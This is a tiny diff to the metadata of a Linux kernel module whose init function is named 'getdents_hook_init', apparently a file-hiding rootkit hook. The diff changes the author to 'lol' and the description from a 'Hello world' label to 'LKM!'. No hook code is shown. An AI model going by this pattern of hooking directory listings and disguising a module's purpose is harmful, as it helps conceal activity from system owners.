@@ -143,8 +143,8 @@ static void __exit unload(void)
 module_init(getdents_hook_init);
 module_exit(unload);
 
-MODULE_AUTHOR("Akshat Sinha"); 
-MODULE_DESCRIPTION("A simple Hello world LKM!"); 
+MODULE_AUTHOR("lol"); 
+MODULE_DESCRIPTION("LKM!"); 
 MODULE_LICENSE("GPL"); 
 MODULE_VERSION("0.1"); 
 /*out:
